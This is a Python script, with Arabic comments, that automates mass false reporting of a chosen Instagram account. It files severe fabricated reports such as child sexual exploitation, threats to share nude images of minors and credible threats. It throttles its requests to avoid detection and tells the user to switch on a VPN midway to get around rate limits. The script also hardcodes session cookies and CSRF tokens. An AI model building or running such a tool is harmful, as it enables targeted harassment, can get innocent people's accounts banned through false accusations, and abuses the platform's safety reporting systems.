import requests
import time

# القائمة الأولى للبلاغات قبل VPN
first_reports = [
    "[\"adult_content-nudity_or_sexual_activity\"]",
    "[\"violence_hate_or_exploitation-sexual_exploitation-yes\"]",
    "[\"adult_content-threat_to_share_nude_images-u18-yes\"]",
    "[\"suicide_or_self_harm_concern-suicide_or_self_injury\"]",
    "[\"ig_scam_financial_investment\"]"
]

# القائمة الثانية للبلاغات بعد VPN
second_reports = [
    "[\"selling_or_promoting_restricted_items-drugs-high-risk\"]",
    "[\"violent_hateful_or_disturbing-credible_threat\"]",
    "[\"suicide_or_self_harm_concern-eating_disorder\"]",
    "[\"adult_content-threat_to_share_nude_images-u18-yes\"]",
    "[\"harrassment_or_abuse-harassment-me-u18-yes\"]",
    "[\"violence_hate_or_exploitation-sexual_exploitation-yes\"]"
]

# معلومات الاتصال الأساسية
url = "https://www.instagram.com/api/v1/web/reports/get_frx_prompt/"
id = input("enter user id: ")
session = input("enter seesionid: ")
# الهيدرات المطلوبة
headers = {
    'User-Agent': "Mozilla/5.0 (Linux; Android 9; SH-M24 Build/PQ3A.190705.09121607; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.82 Safari/537.36 InstagramLite 1.0.0.0.145 Android (28/9; 240dpi; 900x1600; AQUOS; SH-M24; gracelte; qcom; ar_EG; 115357035)",
    'sec-ch-ua': "\"Chromium\";v=\"124\", \"Android WebView\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
    'x-ig-www-claim': "hmac.AR3_rYnLKeBezIQYHfIUtjIcljl6VzAqGT8JGhQ_M0eCdWOV",
    'x-web-session-id': "m3n2go:suujxi:8c53jj",
    'sec-ch-ua-platform-version': "\"9.0.0\"",
    'x-requested-with': "XMLHttpRequest",
    'sec-ch-ua-full-version-list': "\"Chromium\";v=\"124.0.6367.82\", \"Android WebView\";v=\"124.0.6367.82\", \"Not-A.Brand\";v=\"99.0.0.0\"",
    'sec-ch-prefers-color-scheme': "light",
    'x-csrftoken': "FxCF6jR5tSy3wdcZCfRIZN5viVxZmV1k",
    'sec-ch-ua-platform': "\"Android\"",
    'x-ig-app-id': "936619743392459",
    'sec-ch-ua-model': "\"SH-M24\"",
    'sec-ch-ua-mobile': "?0",
    'x-instagram-ajax': "1028279148",
    'x-asbd-id': "359341",
    'origin': "https://www.instagram.com",
    'sec-fetch-site': "same-origin",
    'sec-fetch-mode': "cors",
    'sec-fetch-dest': "empty",
    'referer': "https://www.instagram.com/dr.mahmoud.91/",
    'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
    'priority': "u=1, i"
}

# الكوكيز
cookies = {
    'datr': 't2_paGIejmErDTIjIjwWF7gG',
    'ig_did': 'DD344728-1E3E-4946-AD3E-CAF859846F92',
    'dpr': '1.5',
    'mid': 'aOlvtwABAAEzroEkqUYna_SvGNJS',
    'csrftoken': 'FxCF6jR5tSy3wdcZCfRIZN5viVxZmV1k',
    'ig_nrcb': '1',
    'wd': '600x1043',
    'ds_user_id': '76486059622',
    'ps_l': '1',
    'ps_n': '1',
    'sessionid':session ,
    'rur': '"RVA\\05476486059622\\0541791670864:01fe3167f0753030cebb866598515e7ba79f9e395da4160195b582c2ab2f4272410b88ee"'
}

def get_context():
    """الحصول على context من Instagram"""
    nok = {
        'container_module': 'profilePage',
        'entry_point': '1',
        'location': '2',
        'object_id': id,
        'object_type': '5',
        'frx_prompt_request_type': '1',
    }
    
    try:
        response = requests.post(
            'https://www.instagram.com/api/v1/web/reports/get_frx_prompt/',
            cookies=cookies,
            headers=headers,
            data=nok,
        )
        
        if response.status_code == 200:
            return response.json()['response']['context']
        else:
            print(f"خطأ في الحصول على context: {response.status_code}")
            return None
    except Exception as e:
        print(f"خطأ: {e}")
        return None

def send_report(report_type, report_name):
    """إرسال بلاغ معين"""
    context = get_context()
    
    if not context:
        print(f"فشل إرسال البلاغ: {report_name}")
        return False
    
    payload = {
        'container_module': "profilePage",
        'entry_point': "1",
        'location': "2",
        'object_id': id,
        'object_type': "5",
        'context': context,
        'selected_tag_types': report_type,
        'frx_prompt_request_type': "2",
        'jazoest': "22816"
    }
    
    try:
        response = requests.post(url, data=payload, headers=headers, cookies=cookies)
        
        if response.status_code == 200:
            print(f"✓ تم إرسال البلاغ: {report_name}")
            return True
        else:
            print(f"✗ فشل إرسال البلاغ {report_name}: {response.status_code}")
            return False
    except Exception as e:
        print(f"✗ خطأ في إرسال البلاغ {report_name}: {e}")
        return False

def send_reports_list(reports_list, phase_name):
    """إرسال قائمة من البلاغات"""
    print(f"\n{'='*50}")
    print(f"بدء إرسال البلاغات - {phase_name}")
    print(f"{'='*50}")
    
    successful_reports = 0
    total_reports = len(reports_list)
    
    for i, report in enumerate(reports_list, 1):
        # استخراج اسم البلاغ من السلسلة
        report_name = report.replace('["', '').replace('"]', '')
        print(f"\n[{i}/{total_reports}] جاري إرسال: {report_name}")
        
        if send_report(report, report_name):
            successful_reports += 1
        
        # تأخير بسيط بين البلاغات لتجنب الحظر
        time.sleep(2)
    
    print(f"\n{'='*50}")
    print(f"اكتملت {phase_name}")
    print(f"البلاغات الناجحة: {successful_reports}/{total_reports}")
    print(f"{'='*50}")
    return successful_reports

def main():
    # المرحلة الأولى: إرسال البلاغات قبل VPN
    print("🚀 بدء عملية الإبلاغ على Instagram")
    print(f"🎯 الهدف: {id}")
    
    send_reports_list(first_reports, "المرحلة الأولى (قبل VPN)")
    
    # طلب تشغيل VPN
    print("\n" + "="*50)
    print("⏸️  تم الانتهاء من البلاغات الأولى")
    print("🔌 الرجاء تشغيل VPN الآن")
    print("="*50)
    
    input("اضغط Enter بعد تشغيل VPN للمتابعة...")
    
    # المرحلة الثانية: إرسال البلاغات بعد VPN
    print("\n" + "="*50)
    print("✅ تم تأكيد تشغيل VPN")
    print("🚀 بدء المرحلة الثانية من البلاغات")
    print("="*50)
    
    send_reports_list(second_reports, "المرحلة الثانية (بعد VPN)")
    
    # الملخص النهائي
    print("\n" + "="*50)
    print("🎉 اكتملت عملية الإبلاغ بنجاح!")
    print("="*50)
    print(f"📊 إجمالي البلاغات المرسلة: {len(first_reports) + len(second_reports)}")
    print(f"   - المرحلة الأولى: {len(first_reports)} بلاغ")
    print(f"   - المرحلة الثانية: {len(second_reports)} بلاغ")
    print("="*50)

if __name__ == "__main__":
    main()